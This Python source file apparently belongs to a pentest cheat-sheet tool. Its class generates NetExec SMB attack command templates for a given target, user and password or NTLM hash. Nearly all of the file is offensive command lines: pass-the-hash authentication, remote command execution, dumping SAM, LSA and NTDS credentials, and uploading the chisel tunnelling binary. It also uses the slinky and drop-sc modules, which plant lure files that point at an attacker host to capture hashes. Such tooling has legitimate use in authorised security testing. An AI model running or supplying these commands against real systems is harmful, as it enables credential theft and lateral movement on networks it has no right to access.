from command.Command import Command
from Util import getarg

class CommandNxcSmb(Command):
    def __init__(self, name: str, config: dict[str, str], tags : list[str]):
        super().__init__(name, config, tags)
        self.lhost = config['defaults']['lhost']


    def matchesTrigger(self, trigger : str) -> bool:
        triggerLower = trigger.lower()
        triggers = ['nxc-smb', 'netexec-smb', 'cme-smb', 'crackmapexec-smb']
        return any(word in triggerLower for word in triggers)


    def getHelp(self) -> str:
        return 'nxc-smb <target-spec> [<user-spec>] [<auth-spec>]'


    def genCommands(self, trigger: str, args: list[str]) -> list[str]:
        if len(args) < 1:
            return [self.getHelp()]

        targetSpec = getarg(args, 0) or '<target-spec>'
        userSpec = getarg(args, 1) or '<user-spec>'
        authSpec = getarg(args, 2) or '<auth-spec>'

        command = 'whoami /priv'
        localPath = 'chisel64.exe'
        remotePath = 'c:\\windows\\temp\\pwn\\chisel64.exe'

        commands = []
        commands.append('# Basic usage')
        commands.append('## Using password')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\'')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -d .')
        commands.append('## Using hash')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -H {authSpec}')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -H {authSpec} -d .')
        commands.append('')

        commands.append('# Eecute commands (as admin)')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -x \'{command}\'')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -X \'{command}\'')
        commands.append('')

        commands.append('# Dumping (as admin / domain admin)')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --sam')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --lsa')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --ntds')
        commands.append('')

        commands.append('# SMB shares')
        commands.append('## List SMB shares')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --shares')
        commands.append('## Transfer files')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --share <share-name> --get-file {remotePath} {localPath}')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --share <share-name> --put-file {localPath} {remotePath}')
        commands.append('')

        commands.append('# General enumeration')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --pass-pol')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --users')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --loggedon-users')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' --sessions')
        commands.append('')

        commands.append('# Misc')
        commands.append(f'nxc smb {targetSpec} --gen-relay-list relay-list.txt')

        commands.append('# Useful modules')
        commands.append('## slinky')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M slinky -o server={self.lhost} name=afriedlyshortcut')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M slinky -o cleanup=yes name=afriedlyshortcut')
        commands.append('## drop-sc')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M drop-sc -o url=\\\\{self.lhost}\\test share=exampleshare filename=important.txt')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M drop-sc -o cleanup=true share=exampleshare filename=important.txt')
        commands.append('## spider_plus')
        commands.append(f'nxc smb {targetSpec} -u {userSpec} -p \'{authSpec}\' -M spider_plus -o exclude_dir=IPC$,PRINT$,NETLOGON,SYSVOL')

        return commands
